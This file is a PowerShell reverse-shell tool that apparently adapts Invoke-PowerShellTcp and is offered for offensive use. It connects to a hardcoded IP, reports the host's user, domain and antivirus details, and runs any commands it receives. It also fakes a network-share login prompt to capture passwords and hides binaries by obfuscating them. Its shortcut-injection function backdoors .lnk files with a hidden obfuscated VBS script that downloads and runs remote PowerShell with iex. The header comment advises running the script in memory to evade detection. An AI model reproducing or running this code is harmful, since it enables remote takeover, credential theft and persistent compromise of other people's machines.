<#

tcp-client  TCP reverse shell variant of the async-client 

Code derived from Invoke-PowerShellTcp, written
by Nikhil "SamratAshok" Mittal ( GPLv3 ).

Contains most of the original TCP communications, also added most of the new functions from the async-client.

I created this to have a variant that only needs an open tcp socket [ ex: nc -lvvp 443 ] 
It does NOT require the async-shell-handler C&C component.

The code is self contained without one needing to pass any parameters, just the the web server ip hosting this script in the IEX.

Insure this file is only executed in memory via iex to decrease the likelihood of detection.

xor-function

#>


function start-rsh
{

	#[->] Enter the ip address and port information here
        $IPAddress = '192.168.43.150' # [->] Change this example
        $Port = '443' # [->] Change this example 



        #[->] encode a string with base64 to prep for obfuscation do not use this for encoded commands since UTF8
        function base64string-encode {

                param($string)

                # Use this to encode strings to base64 format
                $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

                return $encstring
        }

        function base64string-decode {

                param($encstring)

                # Don't have to worry about unsafe url characters since it's content not a url string
                $decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

                return $decstring
        }

        function gen-key {

                $rs = New-Object System.Random
                1..70 | % { $obfukey += [Char]$rs.next(97,122) }
                $kstring = [string]::join("", ($obfukey))
                return $kstring

        }


        function get-info {

                $domain = $env:UserDomain
                $LogOnServer = $env:LogOnServer
                $userName = $env:UserName
                $machineName = $env:ComputerName

                $OS = (gwmi Win32_OperatingSystem).caption
                $SysDescription = (gwmi Win32_OperatingSystem).description
                $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
                $PsVersion = $PSVersionTable.PSVersion.Major

                # Create table of AV software
                $avServices = @{"symantec" = "Symantec";
                                "navapsvc" = "Norton";
                                "mcshield" = "McAfee";
                                "windefend" = "Windows Defender";
                                "savservice" = "Sophos";
                                "avp" = "Kaspersky";
                                "SBAMSvc" = "Vipre";
                                "avast!" = "Avast";
                                "fsma" = "F-Secure";
                                "antivirservice" = "AntiVir";
                                "avguard" = "Avira";
                                "fpavserver" = "F-Protect";
                                "pshost" = "Panda Security";
                                "pavsrv" = "Panda AntiVirus";
                                "bdss" = "BitDefender";
                                "avkproxy" = "G_Data AntiVirus";
                                "klblmain" = "Kaspersky Lab AntiVirus";
                                "vbservprof" = "Symantec VirusBlast";
                                "ekrn" = "ESET";
                                "abmainsv" = "ArcaBit/ArcaVir";
                                "ikarus-guardx" = "IKARUS";
                                "clamav" = "ClamAV";
                                "aveservice" = "Avast";
                                "immunetprotect" = "Immunet";
                                "msmpsvc" = "Microsoft Security Essentials";
                                "msmpeng" = "Microsoft Security Essentials";
                }


                #[->] generate summary of client
                $summary  = "============[ System Summary ]==============`n"
                $summary += "Domain       : $domain`n"
                $summary += "LogOn Server : $LogOnServer`n"
                $summary += "User Name    : $userName`n"
                $summary += "ComputerName : $machineName`n"
                $summary += "Admin        : $IsAdmin`n"
                $summary += "PS version   : $PsVersion`n"
                $summary += "OS version   : $OS`n"
                $summary += "Description  : $SysDescription`n"
                $summary += "======[ Detected Antivirus Services ]=======`n"

                #[->] get current services
                $services = (gwmi win32_service).name

                foreach ($S in $avServices.GetEnumerator()) {
                        if ( $services -match $($S.Name) ) { $summary += "$($S.Name): $($S.Value)`n" }
                }

                return $summary

        }

        #[->] byte encoding decoding are for dealing with binary obfuscation
        function byte-encode {

                param($binaryPath)

                $test = Test-Path $binaryPath -IsValid

                if ($test -eq $True)
                {

                        $binBytes = get-content -Path $binaryPath -Encoding Byte
                        $binb64String = [System.Convert]::ToBase64String($binBytes)

                        $key = gen-key

                        $obfuscated = obfuscate-base64 hide $key $binb64String
                        $obfuscated > 'New-File.txt'

                        $report = "[!] Key generated is : $key `n"
                        $report += "[!] wrote obfuscated data to New-File.txt!"

                        return $report

                }


        }


        #[->] recovers binaries encoded in obfuscated base64 strings
        function byte-decode( $b64file, $key ) {

                if ($key) {

                        $test = Test-Path $b64file -IsValid

                        if ($test -eq $True)
                        {

                                $obfb64string = get-content $b64file | Out-String
                                $deobfuscated = obfuscate-base64 clear $key $obfb64string

                                $bytes = [System.Convert]::FromBase64String($deobfuscated)
                                set-content -Path .\change-extension -Value $bytes -Encoding Byte

                                write-output "[!] created new binary change the extension manually!"

                        }

                } else { return "[!] Failed! : The required key was not provided." }

        }

        #[->] thx Mubix for the idea ;)
        function askfor-creds {

                $credentials = $Host.UI.PromptForCredential('Reconnect to Network Share','',[Environment]::UserName,[Environment]::UserDomainName)

                $user   = [Environment]::UserName
                $domain = [Environment]::UserDomainName
                $pass = $credentials.getnetworkcredential().password

                $summary = 'Domain\User: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass

                return $summary

        }

        function gen-enccmd {

                param($clrcmd)

                $bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString())
                $enccmd = [Convert]::ToBase64String($bytescmd)

                retrun $enccmd
        }

        #[->] decodes a powershell formatted encoded command
        function dec-enccmd {

                param($enccmd)

                $cmdString = [System.Text.Encoding]::Unicode.getString([System.Convert]::Frombase64String($enccmd))

                return $cmdString
        }

        #[->] pass a sentence as a string so it can be spoken by the system
        function say-this {

                param($s)

                if ($s) {

                        $voice = new-object -com SAPI.SpVoice
                        $voice.speak("$s")

                } else { return "[!] you need to specifiy what you want said in quotes. Ex say-sentece < your sentence >" }

        }

#[->] requires the name of the shortcut along with a url hosting your PS script
#[->] example: shortcut-inject "Chrome.lnk" "https://your-domain.com/ps-script"
function shortcut-inject { 

	[CmdletBinding()] Param(
	
	[Parameter(Position=0, Mandatory = $true)]
	[String]
	$shortcut,
	
	[Parameter(Position=1, Mandatory = $true)]
	[String]
	$scriptUrl

	)
	
	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) { 
	
	
		#[->] internal function for variable name randomization
		function rand-str { 
	
			$rint = get-random -max 10 -min 3
			$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
			1..$rint | % { $rchr += $charArray | get-random }
			$randstr = [string]::join("", ($rchr))
		
			return $randstr	
		}
	
		#[->] Passing .lnk full path as variable
		$shortcutFullname = (gci $shortcut).Fullname
		$location = (gci $shortcut).DirectoryName
		$lnkName = (gci $shortcut).Name
		$newlnkName = 'New ' + $lnkName
		$newshortcutFullname = $location + '\' + $newlnkName
	
		#[->] extracting original properties from selected icon
		$wsh = New-Object -COM WScript.Shell
		$targetPath = $wsh.CreateShortcut("$shortcutFullname").TargetPath
		$workingDir = $wsh.CreateShortcut("$shortcutFullname").WorkingDirectory
		# $iconloc    = $wsh.CreateShortcut("$shortcutFullname").IconLocation
		# $descript   = $wsh.CreateShortcut("$shortcutFullname").Description
	
		#[->] Get name of binary without full path to use as icon target
		$targetBinary = (gci $targetPath).Name

		#####################################
		#[->] VBS CODE GENERATION BEGINS [<-]
	
		#[->] prep command download string to be passed to obfuscation engine
		$cmdstring = 'cmd /q /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" '
	
		#[->] create vbs script then change attribute to hidden
		$saveDir = $env:localappdata + '\'
	
		#[->] set variables for template generation
		$newline = "`r`n"
		$vbsfile = $newline

		#[->] initialize first function in vbs script 
		$randfunc1 = rand-str
		$vbsfile += 'Function ' + $randfunc1 + '() ' + $newline

		#[->] Obfuscate first wscript command string
		$cmdstrArray = @()
		[int]$ccnt = '1'
		foreach ( $char in $cmdstring.GetEnumerator() ) {

			#[->] translate to ascii value then do math ops on it
			$val = [Byte][Char]$char
			$rnum = get-random -max 9 -min 1
			$nval = [int]$val - [int]$rnum
			$hval = [int]$nval / '2'

			if ( [int]$ccnt -eq '1' ) 
			{

				#[->] genrate random variable name then append it to array
				$rvarstr = rand-str
				$rvarstr += rand-str
				$cmdstrArray += $rvarstr
				$vbsfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'

			
			} else {

				$vbsfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
	
			}
		
			#[->] create random legnth of char use 
			$randval = get-random -max 12 -min 1 
			if ( $randval -eq '8' ) { $vbsfile += $newline; [int]$ccnt = 0 }
			$ccnt++

		}

		#[->] concatinate vars to single command string
		[int]$cnt = 1
		foreach ( $randvar in $cmdstrArray )  {
		
			if ( $cnt -eq '1' ) 
			{ 
				$mainRvar = rand-str
				$vbsfile += $newline
				$vbsfile += $mainRvar + ' = ' + $randvar 
		
			} else {
		
				$vbsfile += ' + ' + $randvar 
		
			}
		
			$cnt++
		
		}
	
		$fso1 = rand-str
		$vbsfile += $newline
		$vbsfile += 'set ' + $fso1 + ' = ' + 'createObject("wscript.shell")' + $newline
		$vbsfile += $fso1 + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
		$vbsfile += 'End Function' + $newline
	
		#[->] initialize second function 
		$randfunc2 = rand-str
		$vbsfile += 'Function ' + $randfunc2 + '() ' + $newline
	
		$fso2 = rand-str
		$vbsfile += 'set ' + $fso2 + ' = ' + 'createObject("wscript.shell")' + $newline
	
		$vbsfile += $fso2 + '.run ' +  '"' + 'cmd /c ' + 'start ' + $targetBinary +  '"' + ',' + ' 0, ' + 'false' + $newline
		$vbsfile += 'End Function' + $newline
	
		$vbsfile += $randfunc1 + $newline + $randfunc2
	
		#[->] vbs script in "vbsfile" is ready to be written to disk
	
		$rand = rand-str; $vbsName = $rand + '.vbs'
		$vbspath = $saveDir + $vbsName
	
		set-content $vbspath $vbsfile -Encoding ASCII
		$vbsAtt = get-item $vbspath
		$vbsAtt.attributes="Hidden"
	
		#################################
		#[->] VBS CODE GENERATION END [<-]
	
		#[->] Delete original shortcut 
		Remove-Item $shortcutFullname
	
		#[->] Modify values acquired from original shortcut 
		$wsh2 = New-Object -COM WScript.Shell
		$newSc = $shortcutFullname
		$newShortcut = $wsh2.CreateShortcut("$newSc")
		$newShortcut.TargetPath = "c:\windows\system32\cmd.exe"
		$newShortcut.WorkingDirectory = $workingDir

		#[->] Set shortcut arguments	
		$args = '/c ' + '"' + $vbspath + '"'
		$newShortcut.Arguments = "$args"
		$newIcon = $targetPath + ',0'
		$newShortcut.IconLocation = "$newIcon"
		$newShortcut.Save();
	
		# write-output "[+] Icon location: $newIcon"
		write-output "[+] finished injecting command string into shortcut."

	} else { write-output "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script" }

}


	# action = hide or clear
	# key = encrpytion or decryption string
	# string = base64 string to either be encrypted or decrypted

	function obfuscate-base64( $action, $key, $string ) {

		$alpha = @{ "1" = "A";
                	"2" = "B";
                	"3" = "C";
                	"4" = "D";
                    	"5" = "E";
			"6" = "F";
                    	"7" = "G";
                    	"8" = "H";
                    	"9" = "I";
                    	"10" = "J";
                    	"11" = "K";
                    	"12" = "L";
                    	"13" = "M";
        	    	"14" = "N";
                    	"15" = "O";
                    	"16" = "P";
                    	"17" = "Q";
                    	"18" = "R";
                    	"19" = "S";
                    	"20" = "T";
                    	"21" = "U";
                    	"22" = "V";
                    	"23" = "W";
                    	"24" = "X";
                    	"25" = "Y";
                    	"26" = "Z"; 
		}
		
		$inv_alpha = @{}

		#[->] create another hash table like alpha but with inverted values
		foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)}

		$count = 0
		foreach ($ch in $string.GetEnumerator()) 
		{ 

			$c = [string]$ch
			if ( $c -match '[a-zA-Z]') 
			{ 

				$ival = $inv_alpha[$c]
				$s = $key[$count]

				if (!$s) { $count = 0; $s = $key[0] }  # reset key to begining

				#[->] juggling variable formats between integer and string methods
				$ss = [string]$s
				$S = $ss.ToUpper()
				$shift = $inv_alpha[$S]

				if ($action -match 'hide' ) 
				 { $val = [int]$ival + [int]$shift } 
				 else { $val = [int]$ival - [int]$shift } 

				if ( [int]$val -lt '1'  ) { $val = [int]$val + '26' }
				if ( [int]$val -gt '26' ) { $val = [int]$val - '26' }

				#[->] juggling variable formats between integer and string methods
				$sval = [string]$val
				$char = $alpha[$sval]
				$schar = [string]$char

				if ( $c -cmatch '[a-z]' ) 
			   		{ $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) } 
		        	elseif ( $c -cmatch '[A-Z]' ) 
			   		{ $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) } 

				$count++

			} else { $ncipher += [string]::join("", ($c)) }

		} 

		$scipher = [string]$ncipher
		return $scipher

	}

	#[->] requires file name and file path if not in the same running directory
	function obfuscate {

		param($filePath) 

		$test = Test-Path $filePath -IsValid

		if ($test -eq $True) 
		{

			$fileBytes = get-content -Path $filePath -Encoding Byte
			$base64String = [System.Convert]::ToBase64String($fileBytes)

			$nKey = gen-key 
			$action = 'hide'

			$obfuscated = obfuscate-base64 ( $action, $nkey, $base64String )
			$obfuscated > 'New-File.txt'

			$report = "[!] Key generated is : $nKey"  
        		$report += "[!] wrote obfuscated data to New-File.txt!"

			return $report

	 	} else { $report = "[!] File path is not valid!"; write-output $report }


	}

	function de-obfuscate ( $filePath, $key ) {

		if ($key) 
		{ 

        		$test = Test-Path $filePath -IsValid
			if ($test -eq $True) 
			{

                		$fileString = get-content $filePath | Out-String
                		$action = 'clear'

                		$obfuscated = obfuscate-base64 ( $action, $key, $fileString )
                		$obfuscated > 'New-File.txt'

                		$report = "[!] Key generated is : $nKey"
                		$report += "[!] wrote obfuscated data to New-File.txt!"

                		write-output $report

         		} else { $report = "[!] File path is not valid!"; write-output $report }


		} else { $report = "[!] You need to provide a de-obfuscation key!"; write-output $report } 

	}


    
	try 
    	{
        	# Connect back if the reverse switch is used.
        	$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
       
        	$stream = $client.GetStream()
        	[byte[]]$bytes = 0..65535|%{0}

        	#Send back general info
		$profile = ( Invoke-Expression -Command get-info 2>&1 | Out-String )
        	$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell: Copyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n" + "$profile")
       		$stream.Write($sendbytes,0,$sendbytes.Length)

        	#Show an interactive PowerShell prompt
        	$sendbytes = ([text.encoding]::ASCII).GetBytes("RSH => " + (Get-Location).Path + '> ')
        	$stream.Write($sendbytes,0,$sendbytes.Length)

        	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        	{
            		$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            		$data = $EncodedText.GetString($bytes,0, $i)
            		try
            	{
                	#Execute the command on the target.
                	$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            	}
            	catch
            	{
                	Write-Warning "Something went wrong with execution of command on the target." 
                	Write-Error $_
            	}
            	$sendback2  = $sendback + "RSH => " + (Get-Location).Path + '> '
            	$x = ($error[0] | Out-String)
            	$error.clear()
            	$sendback2 = $sendback2 + $x

            	#Return the results
            	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            	$stream.Write($sendbyte,0,$sendbyte.Length)
            	$stream.Flush()  
        	}
        	$client.Close()
        	if ($listener)
        	{
            	$listener.Stop()
        	}
    	}
    	catch
    	{
        	Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        	Write-Error $_
    	}

}

start-rsh

